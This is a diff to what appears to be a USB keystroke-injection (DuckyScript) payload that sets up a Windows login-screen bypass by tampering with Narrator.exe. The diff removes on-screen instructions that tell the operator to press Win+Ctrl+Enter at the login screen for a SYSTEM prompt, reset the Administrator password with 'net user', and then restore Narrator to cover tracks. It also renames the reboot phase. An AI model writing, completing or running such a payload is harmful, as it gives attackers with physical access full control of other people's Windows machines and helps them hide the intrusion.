@@ -154,94 +154,14 @@ DELAY 500
 
 STRING dir %SYSDRIVE%:\Windows\System32\Narrator.*
 ENTER
-DELAY 2000
+DELAY 1000
 
 STRING echo.
 ENTER
 DELAY 300
 
 REM ================================================================
-REM PHASE 6: DISPLAY INSTRUCTIONS
-REM ================================================================
-
-STRING echo [*] Step 4/4: Preparation complete!
-ENTER
-DELAY 300
-
-STRING echo.
-ENTER
-DELAY 300
-
-STRING echo ================================================================
-ENTER
-DELAY 300
-
-STRING echo     NEXT STEPS AFTER REBOOT:
-ENTER
-DELAY 300
-
-STRING echo ================================================================
-ENTER
-DELAY 300
-
-STRING echo.
-ENTER
-DELAY 300
-
-STRING echo [!] At login screen, press: Win + Ctrl + Enter
-ENTER
-DELAY 300
-
-STRING echo [!] A CMD prompt will open as SYSTEM
-ENTER
-DELAY 300
-
-STRING echo.
-ENTER
-DELAY 300
-
-STRING echo [!] Change admin password:
-ENTER
-DELAY 300
-
-STRING echo     net user
-ENTER
-DELAY 300
-
-STRING echo     net user Administrator NewPassword123
-ENTER
-DELAY 300
-
-STRING echo.
-ENTER
-DELAY 300
-
-STRING echo [!] CLEANUP (after login):
-ENTER
-DELAY 300
-
-STRING echo     copy C:\Windows\System32\Narrator.bak C:\Windows\System32\Narrator.exe
-ENTER
-DELAY 300
-
-STRING echo     del C:\Windows\System32\Narrator.bak
-ENTER
-DELAY 300
-
-STRING echo.
-ENTER
-DELAY 300
-
-STRING echo ================================================================
-ENTER
-DELAY 300
-
-STRING echo.
-ENTER
-DELAY 500
-
-REM ================================================================
-REM PHASE 7: REBOOT SYSTEM
+REM PHASE 6: REBOOT SYSTEM
 REM ================================================================
 
 STRING echo [*] Rebooting in 5 seconds...
